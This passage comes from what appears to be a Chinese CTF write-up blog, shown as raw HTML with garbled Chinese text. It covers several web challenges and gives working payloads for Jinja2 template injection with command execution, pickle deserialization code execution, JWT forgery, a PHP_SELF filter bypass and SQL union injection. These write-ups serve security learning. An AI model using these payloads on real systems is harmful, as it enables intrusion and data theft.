class="hljs-attribute">X</span>-Remote-addr:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">HTTP_CLIENT_IP</span>:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Real-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Originating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">via</span>:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>æµ‹è¯•ä»…client-ipå¯ä»¥ä½¿ç”¨<br>headerä¸­æ·»åŠ client-ip<br>file_get_contentsç”¨phpä¼ªåè®®ç»•è¿‡</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">?<span class="hljs-number">2333</span>=php://<span class="hljs-built_in">input</span><br>pos<span class="hljs-variable">t:todat</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">a</span> happy day<br></code></pre></td></tr></table></figure><p>è¿™æ­¥å¼€å§‹ç”¨burpæ“ä½œï¼Œhackbaræœ‰ç‚¹é—®é¢˜</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl">function change($v)&#123; <br>    $v = base64_decode($v); <br>    $re = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($v);$i++)&#123; <br>        $re .= <span class="hljs-keyword">chr</span> ( <span class="hljs-keyword">ord</span> ($v[$i]) + $i*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> $re; <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™å—åå‘ç¼–è¯‘ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> );<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/KZK2SNH27KTYEM6Y.png"></p><h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>ç‚¹å‡»sourceæŸ¥çœ‹æºç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-regexp">//</span> FLAG is defined <span class="hljs-keyword">in</span> config.php<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$secret</span> = bin2hex(random_bytes(<span class="hljs-number">64</span>));<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$guess</span> = (string) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>  <span class="hljs-keyword">if</span> (hash_equals(<span class="hljs-variable">$secret</span>, <span class="hljs-variable">$guess</span>)) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>  &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>ä»£ç å‘Šè¯‰äº†æˆ‘ä»¬flagåœ¨config.phpé‡Œ<br>ä½†æ˜¯ä¸‹é¢åˆè¿‡æ»¤äº†config.php&#x2F;<br>$_SERVER[â€˜PHP_SELFâ€™]è¿”å›çš„æ˜¯è·¯å¾„+è„šæœ¬å<br>ä¸‹é¢æœ‰ä¸€è¡Œä»£ç è¡¨ç¤ºå¯ä»¥ç›´æ¥è·å¾—flagï¼Œä½†è¦èƒ½å¤Ÿç ´è§£éšæœºæ•°å°±èƒ½å¾—åˆ°flagï¼Œè¿™ä¸ªéš¾åº¦å¤ªå¤§äº†ã€‚ã€‚</p><p>è¿™é‡Œæ˜¯æœ‰çªç ´ç‚¹çš„</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œ&#x2F;config.php/*$æ˜¯åŒ¹é…äº†å°¾éƒ¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°¾éƒ¨æ·»åŠ ä¸å¯æ˜¾å­—ç¬¦æ¥ç»•è¿‡æ­£åˆ™ï¼Œæ¯”å¦‚%ff</p><p>basename()<br>ä¼šè¿”å›è·¯å¾„é‡çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚æ¯”å¦‚&#x2F;index.php&#x2F;config.phpä½¿ç”¨basename()ä¹‹åè¿”å›config.phpã€‚<br>basename()ä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ã€‚</p><p>è¿™é‡Œå†™ä¸€æ®µphpè¯­å¥æ¥ææ¸…æ¥š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;index.php/config.php%ff?source&#x27;</span>).<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>].<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p><img src="/images/YVE0N5JFKM9LXPB.png"><br>å› ä¸º$_SERVER[â€˜PHP_SELFâ€™]è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œå½“ä½¿ç”¨äº†PATH_INFOæ—¶ï¼Œè¿™ä¸ªå€¼æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥å°è¯•ç”¨&#x2F;index.php&#x2F;config.php&#x2F;%ff?sourceæ¥è¯»å–flagã€‚<br><img src="/images/RZX7CIEXRHL29BSAOH.png"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>é¢˜ç›®è¯´äº†æ˜¯å…³äºflaskçš„<br>æºä»£ç æœ‰æç¤ºå‚æ•°ä¸ºsearch<br>æ‰€ä»¥ç›´æ¥sstiæ³¨å…¥</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">4</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/DHRQ62NL9WHJ3KCS.png"><br>å› ä¸ºæ˜¯ç”¨flaskæ­å»ºçš„ç½‘ç«™ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ¤æ–­å¾ˆè‡ªç„¶å°±æ˜¯jinja2çš„æ¨¡æ¿æ³¨å…¥ã€‚</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>ç”¨basesæˆ–mroéƒ½è¡Œï¼Œåªè¦æ‰“å°è¿”å›(&lt;class â€˜objectâ€™&gt;,)ï¼Œæ‰¾åˆ°äº†ä»–çš„åŸºç±»objectå³å¯<br><img src="/images/F34OP5L5YL70ND5.png"><br>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨subclasses() è¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›çš„æ˜¯è¿™ä¸ªç±»çš„å­ç±»çš„é›†åˆï¼Œä¹Ÿå°±æ˜¯objectç±»çš„å­ç±»çš„é›†åˆã€‚</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/XB3KH95A5B5FCPYQ.png"><br>åœ¨åŸºæœ¬ç±»çš„å­ç±»ä¸­æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±»(è²Œä¼¼æ˜¯ä¸ªç±»å°±è¡Œ)<br>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥æ‰¾ç¬¬ä¸€ä¸ªæ˜¾ç¤ºçš„ç±»</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/JOCO5EUQUU6V8XXB.png"></p><p>æµ‹è¯•å‘ç°globalsè¢«è¿‡æ»¤äº†ï¼Œä½¿ç”¨æ‹¼å‡‘æ³•ç»•è¿‡</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ©ç”¨evalè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/S9WS6UXXSXDW65FE.png"><br>flagåœ¨flasklightä¸­</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[58].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;cat flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/article/2124510">å…³äºflaskçš„SSTIæ³¨å…¥[é€šä¿—æ˜“æ‡‚]</a><br><a href="https://xz.aliyun.com/t/3679?time__1311=n4+xnD0DBDgDc7D9DUO4BqOoTnl7WSWDIxrD#toc-8">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></p><h2 id="ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun"><a href="#ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun" class="headerlink" title="ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun"></a>ciscn2019-ååŒ—èµ›åŒº-day1-web2-ikun</h2><p>æ ¹æ®é¡µé¢çš„æç¤ºï¼Œéœ€è¦æ‰¾åˆ°lv6<br>ä½†æ˜¯ç¿»äº†å¾ˆå¤šé¡µä¹Ÿæ²¡æœ‰æ‰¾åˆ°lv6<br>å†™ä¸€ä¸ªpythonè„šæœ¬</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import requests<br><br>url = &#x27;http://eca3df9d-<span class="hljs-number">0ecd</span>-<span class="hljs-number">46b6</span>-b0ab-7166f51fb956.node5.buuoj.cn:<span class="hljs-number">81</span>/shop?page=&#x27;<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2000</span>):<br>    a = requests.<span class="hljs-built_in">get</span>(url + str(i))<br>    <span class="hljs-keyword">if</span> &#x27;lv6.png&#x27; <span class="hljs-keyword">in</span> a.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">break</span><br><br></code></pre></td></tr></table></figure><p>åœ¨181é¡µå‘ç°lv6<br>å‘ç°ä»·æ ¼æœ‰ç‚¹é«˜ï¼Œçœ‹èƒ½ä¸èƒ½æŠ“åŒ…æ”¹ä¸‹ä»·æ ¼<br>åªèƒ½æ”¹æŠ˜æ‰£<br><img src="/images/JBFBSKZY4FWH5KWZ7KC.png"></p><p><img src="/images/V7NOFLUCZI1RNT.png"><br>è¿™é‡Œæ¶‰åŠåˆ°JWTä¼ªé€ æ¼æ´<br>æ”»å‡»å·¥å…·<a href="https://link.csdn.net/?target=https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>è·å¾—å¯†åŒ™<br>æˆ‘ä½¿ç”¨çš„æ˜¯kaliç³»ç»Ÿ<br><img src="/images/ECFP2LKJ1JB7QPI9LO8.png"><br>ç ´è§£è·å¾—å¯†åŒ™1Kun<br>ç„¶åè®¿é—®<a href="https://jwt.io/">JWTæ”»å‡»ç½‘ç«™</a>,å°†JWTå¤åˆ¶ä¸Šå»å³å¯<br><img src="/images/JNBAT35QJHZPXF.png"><br>å°†usernameæ”¹ä¸ºadminï¼Œè¿˜æœ‰å°†åˆšæ‰çš„å¯†åŒ™å¡«å…¥<br>å°†cookiesçš„JWTæ›¿æ¢ï¼Œå¾—åˆ°<br><img src="/images/YLWH6TZTRJ3H32BKER9.png"><br>æºç ä¸­å‘ç°<br><img src="/images/R8M363537PNFDRFIUH.png"></p><p>æ‰¾åˆ°admin.py<br><img src="/images/CHUL1P513UOV9ZY610EI.png"><br>è¿™é‡Œå¯ä»¥ç†è§£ä¸ºä¸phpä¸€æ ·çš„ååºåˆ—åŒ–</p><p>self.render(â€˜form.htmlâ€™, res&#x3D;p, member&#x3D;1)<br>è¿™æ®µä»£ç çš„æ„æ€å°±æ˜¯æ‰¾åˆ°æ¨¡æ¿æ–‡ä»¶ï¼Œè¿›è¡Œæ¸²æŸ“ï¼Œä»è€Œæ˜¾ç¤ºé¡µé¢<br>æ¥è§‚å¯Ÿä¸€ä¸‹form.htmlé¡µé¢<br><img src="/images/P0U5OSG2IY3UT03FE6C.png"><br>è¯´æ˜ä¼ å…¥çš„æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œå›æ˜¾çš„ï¼Œè€Œä¸”å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå› æ­¤å­˜åœ¨Pickleååºåˆ—åŒ–æ¼æ´ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªé€šè¿‡pickle.dumpsåºåˆ—åŒ–çš„payloadï¼Œä»è€Œè¢«è§£æè¯»å–flagæˆ–å…¶ä»–ä¿¡æ¯ã€‚<br>æˆ‘ä»¬æ„å»ºä¸€ä¸ªç±»ï¼Œç±»é‡Œé¢çš„__reduce__pythoné­”æœ¯æ–¹æ³•ä¼šåœ¨è¯¥ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨<br>æ„é€ payloadå¯ä»¥ä½¿ç”¨æ–¹æ³•__reduce__(self)ï¼Œå…ˆè¦è·å–çš„flagæ–‡ä»¶çš„ä½ç½®ï¼Œç„¶åè¿›è¡Œè¯»å–</p><p>ç‚¹å‡»ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜åï¼Œæ›¿æ¢become<br>os.systemå’Œos.popen<br>os.system è°ƒç”¨ç³»ç»Ÿå‘½ä»¤ï¼Œå®Œæˆåé€€å‡ºï¼Œè¿”å›ç»“æœæ˜¯å‘½ä»¤æ‰§è¡ŒçŠ¶æ€ï¼Œä¸€èˆ¬æ˜¯0<br>os.popen() æ— æ³•è¯»å–ç¨‹åºæ‰§è¡Œçš„è¿”å›å€¼<br>è¿™ä¸¤ä¸ªå‡½æ•°åªæœ‰ä»¥printè¾“å‡ºæ—¶æ‰ä¼šå›æ˜¾ï¼Œå¦‚æœæ˜¯ä»¥returnè¿”å›çš„å°±ä¸ä¼šæ˜¾ç¤ºç»“æœã€‚<br>å¯ä»¥ä½¿ç”¨commands.getoutput()è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œä»£æ›¿ï¼Œæ„é€ payload</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">ls</span> /&#x27;,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p><img src="/images/VCLCNT98$GCXFF8.png"></p><p><img src="/images/JN7XR4QJ48H7LL1I58.png"></p><p>æ‰¾åˆ°flag.txtæ–‡ä»¶ï¼Œå¹¶è¯»å–</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> payload(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">       return (<span class="hljs-title">commands</span>.<span class="hljs-title">getoutput</span>,(&#x27;<span class="hljs-title">cat</span> /<span class="hljs-title">flag</span>.<span class="hljs-title">txt&#x27;</span>,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = pickle.dumps(<span class="hljs-title">payload</span>())</span><br><span class="hljs-class">a = urllib.quote(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">print a</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br></code></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/252189.html">Python Pickleååºåˆ—åŒ–æ¼æ´</a><br><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">è®¤è¯†JWT</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql-labs</title>
    <link href="/2023/12/14/sql-labs/"/>
    <url>/2023/12/14/sql-labs/</url>
    
    <content type="html"><![CDATA[<h2 id="web517"><a href="#web517" class="headerlink" title="web517"></a>web517</h2><p>ç›´æ¥payload</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">?<span class="hljs-attr">id=</span>-<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span>--+<br>//<span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span>å°±ä¼šå‡ºé”™ï¼Œè¯´æ˜å›æ˜¾ä½æœ‰ä¸‰ä¸ª<br>?<span class="hljs-attr">id=</span>-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+<br>//å›æ˜¾<span class="hljs-number">2</span>ï¼Œ<span class="hljs-number">3</span>è¯´æ˜<span class="hljs-number">2</span>ï¼Œ<span class="hljs-number">3</span>ä¸ºå›æ˜¾ä½<br></code></pre></td></tr></table></figure><p>å…ˆæµ…æµ…çˆ†ä¸ªåº“</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/images/UOG6DQRFVQBV9BY0M4Y7.png"><br>åº“ç”¨ctfshowçš„</p><p>çˆ†è¡¨</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;ctfshow&#x27;</span>--+<br></code></pre></td></tr></table></figure><p><img src="/images/PJZHDF7NPLW1462LL0W.png"></p><p>çˆ†å­—æ®µ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span>--+<br></code></pre></td></tr></table></figure><p><img src="/images/ZXTM998QU2PD8UYRK.png"></p><p>çˆ†å€¼</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag) <span class="hljs-keyword">from</span> flag<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/images/ORRI9MUUD9VVM.png"><br>æŠ¥é”™äº†ï¼Œæ”¹ä¸ºctfshowåº“ä¸‹çš„</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">?id-<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag) <span class="hljs-keyword">from</span> ctfshow.flag--+<br></code></pre></td></tr></table></figure><h2 id="web518"><a href="#web518" class="headerlink" title="web518"></a>web518</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1  æ­£å¸¸<br>?<span class="hljs-attribute">id</span>=1&quot;  æŠ¥é”™ <span class="hljs-string">&#x27; &quot; LIMIT 0,1 &#x27;</span><br>?<span class="hljs-attribute">id</span>=1--+  æ­£å¸¸<br><br>åˆ¤æ–­æ˜¯æ•°å­—å‹æ³¨å…¥<br></code></pre></td></tr></table></figure><p>å…¶ä½™å’Œä¸Šé¢˜ç›¸åŒ</p><h2 id="web519"><a href="#web519" class="headerlink" title="web519"></a>web519</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 